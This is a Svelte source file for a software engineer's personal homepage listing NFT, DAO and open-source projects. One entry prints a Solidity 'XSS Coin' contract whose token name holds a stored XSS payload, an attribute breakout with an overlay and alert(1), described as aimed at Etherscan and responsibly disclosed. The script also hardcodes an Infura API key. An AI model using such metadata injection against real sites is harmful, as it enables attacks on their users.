<script>
  import { onMount } from "svelte";
  import Color from "color";
  import { ethers } from "ethers";

  const provider = new ethers.providers.InfuraProvider(
    "homestead",
    "cef71c1d15634367a332a723b47cf071"
  );

  let style;
  let styleShadow;
  let blockHash = "";
  let color;

  function toKebab(str) {
    return str.replace(/([A-Z])/g, (g) => `-${g[0].toLowerCase()}`);
  }

  function generateCSSVars(vars) {
    return Object.keys(vars)
      .map((name) => `--${toKebab(name)}: ${vars[name]};`)
      .join(" ");
  }

  async function updateStyle(blockNumber) {
    const block = await provider.getBlock(blockNumber);
    blockHash = block.hash;
    color = Color("#" + blockHash.substr(2, 6)).darken(0.8);
    style = generateCSSVars({
      bgColor: color.hex(),
      fgColor: color.negate().hex(),
      linkColor: color.negate().darken(0.3).hex(),
    });
  }

  function onOrientation(orientation) {
    const x = Math.max(Math.min(-orientation.gamma, 5), -5);
    const y = -Math.max(Math.min(45 - orientation.beta, 5), -5);
    styleShadow = generateCSSVars({
      shadowX: x + "px",
      shadowY: y + "px",
      // rotation: -orientation.gamma + 'deg'
    });
  }

  onMount(async () => {
    // window.addEventListener("deviceorientation", onOrientation, true);
    provider.on("block", updateStyle);
    const blockNumber = await provider.getBlockNumber();
    await updateStyle(blockNumber);
  });
  /*
   */
</script>

<h1>Alberto Granzotto</h1>
<p>
  I'm a freelance software engineer interested in decentralization, protocols,
  networking (not the one with business cards), hardware, and open source. This
  page is an overview on things I work on and care about. I've been coding since
  two decades and building software products since one. <strong>
    I'm looking for collaborations to work on projects about privacy, web,
    decentralization, blockchain, ethereum, solidity, open source.
  </strong>
</p>

<section>
  <h2>Currently working on</h2>
  <ul>
    <li>
      Smart contract and dApp development for <a href="https://neokingdom.org/"
        >Neokingdom DAO</a
      >.
    </li>

    <li>
      Doing weird^H^H^H^H^Hcreative projects with <a
        href="https://www.dist0rtion.com">Social Dist0rtion Protocol</a
      >, a collective from the year 2055.
    </li>
  </ul>
</section>

<section>
  <h2>NFT works</h2>

  <ul>
    <li>
      <a href="https://opensea.io/collection/cabinets-by-rafael-rozendaal"
        >Cabinets</a
      >
      (Aug 2022, on-chain, Ethereum) by
      <a href="https://www.newrafael.com/">Rafaël Rozendaal</a>. I developed the
      smart contract and the dapp for the drop.
    </li>

    <li>
      <a href="https://www.decentpoems.art/">Decent Poems</a> (Aug 2022,
      on-chain, Polygon) by
      <a href="https://www.linkedin.com/in/nicolamiotto/">Nicola</a>
      and me. The project won the
      <a href="https://devpost.com/software/decent-poems">third prize</a> (NFT track).
      I co-developed the smart contract and the dapp for the drop.
    </li>

    <li>
      <a href="https://opensea.io/collection/doors-by-rafael-rozendaal">Doors</a
      >
      (June 2022, on-chain, Ethereum) by
      <a href="https://www.newrafael.com/">Rafaël Rozendaal</a>. I developed the
      smart contract and the dapp for the drop.
    </li>

    <li>
      <a href="https://opensea.io/collection/emotons">Emotons</a> (June 2022, Ethereum)
      I co-developed the smart contract and the dapp for the drop.
    </li>

    <li>
      <a href="https://opensea.io/collection/hyperloop-by-ciceri">Hyperloop</a>
      (May 2022, Ethereum) by
      <a href="https://www.newrafael.com/">Umberto Ciceri</a>
      I developed the smart contracts, and worked on encoding the videos.
    </li>

    <li>
      <a href="https://opensea.io/collection/homage-by-rafael-rozendaal"
        >Homage</a
      >
      (March 2022, on-chain, Ethereum) by
      <a href="https://www.newrafael.com/">Rafaël Rozendaal</a>. I co-developed
      the smart contract and the dapp for the drop.
    </li>

    <li>
      <a href="https://github.com/left-gallery/81-horizons/">81 Horizons</a>
      (Dec 2021, on-chain, Ethereum), a collection of 81 landscapes by
      <a href="https://www.newrafael.com/">Rafaël Rozendaal</a>, stored and
      rendered fully on-chain. I programmed the smart contract.
    </li>

    <li>
      <a href="https://github.com/left-gallery/family-maker-wrapper"
        >Family Maker Wrapper</a
      >
      (Oct 2021, Ethereum), a wrapper for the <em>Family Maker</em> token.
    </li>

    <li>
      <a
        href="https://etherscan.io/tx/0x8b74f49daff734e5dd6a74c98817ae252f9e944c41cfac25e127d88a449cb3bb"
        >seasonal amulets</a
      >, (March 2021, Ethereum), a collection of 4 lucky poems. I wrote some
      <a href="https://twitter.com/vrde/status/1369043394115366921"
        >tweets about it</a
      >.
    </li>
  </ul>
</section>

<section>
  <h2>Other projects</h2>
  <ul>
    <li>
      <a href="https://left.gallery/">left.gallery</a> is an online gallery that
      produces and sells downloadable objects since 2015. I'm helping them deploying
      custom ERC-721 contracts (NFT) for their gallery.
    </li>

    <li>
      <a href="https://github.com/vrde/saydao/">SayDAO</a>, an experiment in
      facilitating group decision-making in loosely defined communities. Working
      on it with
      <a href="https://gregmcmullen.net/">Greg McMullen</a>.
    </li>

    <li>
      <a href="https://serenissimo.granzotto.net/">Serenissimo</a> is a bot to
      notify people living in the Veneto region about new vaccination
      appointments. Serenissimo sent 125k notifications, has ~5k subscribers,
      and helped <strong>more than 3.5k people</strong>
      finding an appointment. Articles:
      <a
        href="https://www.italian.tech/2021/05/27/news/in_veneto_i_vaccini_si_prenotano_su_telegram-302860961/"
        >Italian</a
      >,
      <a
        href="https://timdaub.github.io/2021/04/18/vaccination-bot-serenissimo/"
        >English</a
      >.
    </li>

    <li>
      <a href="https://github.com/social-dist0rtion-protocol/thc">THC</a>, a
      framework to create decentalized treasure hunts. We used it to
      <a
        href="https://www.dist0rtion.com/2020/01/30/Planetscape-a-dystopian-escape-game-for-36C3/"
        >create an escape game for 36C3</a
      >.
    </li>

    <li>
      <a href="#/projects/zero-carbon">Zero carbon providers</a>, a collection
      of providers (VPS, hosting, email, etc.) that run their business on
      renewable energy and have a commitment towards the environment.
    </li>

    <li>
      <a href="https://github.com/vrde/ethnode">ethnode</a>, a zero
      configuration tool to run a local Ethereum node. It supports both
      OpenEthereum and Geth.
    </li>

    <li>
      <a
        href="https://rinkeby.etherscan.io/address/0xbc8097678b0a5423d52617e952489fdee3a0eb28"
        >XSS Coin</a
      >, (October 2018, Ethereum Rinkeby), a stored XSS attack on Etherscan
      (responsibly disclosed). That's the code:

      <pre>
pragma solidity ^0.4.24;
import "openzeppelin-solidity/contracts/token/ERC20/StandardToken.sol";

contract XSSCoin is StandardToken &#123;
    string public name = "'
style='position:fixed;top:0;left:0;width:9999px;height:999px;z-index:9'
onmouseenter='alert(1)'";
    string public symbol = "XSSCoin3";
    uint public INITIAL_SUPPLY = 666;

    constructor() public &#123;
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
    }
}
</pre>
    </li>
  </ul>
</section>

<section>
  <h2>Older projects</h2>
  <ul>
    <li>
      <a href="https://gitcoin.co/grants/127/planet-a">Planet A</a>, a
      <em>simulation game</em> to raise awareness on climate change, developed by
      Social Dist0rtion Protocol and LeapDAO.
    </li>
    <li>
      Version 2.0 of the <a
        href="https://github.com/tracking-exposed/web-extension"
      >
        web extension
      </a>
      for <a href="https://tracking.exposed/">Tracking Exposed</a>, an
      initiative to increase transparency behind personalization algorithms. (I
      created also the first version of the extension.)
    </li>
    <li>
      Hardware and software development for Package Point, a locker system to
      speed up delivery and pick-up of parcels.
    </li>

    <li>
      Protocol design and smart contract development for <a
        href="https://github.com/urbi-mobility/contracts/">Ditto</a
      >, an identity protocol for mobility providers developed under
      <a href="https://urbi.co">Urbi</a>.
    </li>
    <li>
      <a href="https://leapdao.org/">LeapDAO</a> as an occasional contributor.
    </li>
    <li>
      Core developer for <a href="https://www.bigchaindb.com">BigchainDB</a>.
    </li>
    <li>Core developer for <a href="https://ascribe.io">ascribe</a>.</li>
    <li>
      Founder of isoverse, a tool for creatives to manage their portfolio using
      dropbox.
    </li>
    <li>
      Founder of <a href="https://medium.com/@vrde/epilogue-18698396094"
        >Urlist</a
      >, a bookmarking service.
    </li>
    <li>Developer for embedded devices for street lighting.</li>
  </ul>
</section>

<section>
  <h2>Playing with</h2>
  <ul>
    <li>
      <a href="https://svelte.dev">Svelte</a> is pretty fun. This website is built
      with svelte—yep that's overkill—but.
    </li>
    <li>
      <a href="https://www.albertogranzotto.com">Photography</a> but the website
      is work in progress :)
    </li>
  </ul>
</section>

<section>
  <h2>Contact</h2>
  <ul>
    <li><a href="https://twitter.com/vrde">vrde on Twitter</a></li>
    <li><a href="https://github.com/vrde">vrde on GitHub</a></li>
    <li><a href="mailto:alberto@granzotto.net">email</a></li>
    <li><a href="https://vrde.github.com/cv">Slightly outdated CV</a></li>
  </ul>
</section>

<section>
  <h2>About this site</h2>
  <p>
    The background changes color every time a new block in the Ethereum network
    is mined. Last block is <code
      >{blockHash.substr(0, 6) + "…" + blockHash.substr(62, 4)}</code
    >
  </p>
</section>

<style>
  section {
    /*transform: rotate(var(--rotation));*/
    padding: 0 20px 10px 20px;
    border: 2px solid rgba(255, 255, 255, 0.05);
    box-shadow: var(--shadow-x, 4px) var(--shadow-y, 4px) rgba(0, 0, 0, 0.25);
    background: rgba(0, 0, 0, 0.1);
    margin: 30px auto;
    /*transition: box-shadow 1s;*/
  }

  pre {
    overflow: auto;
  }
</style>
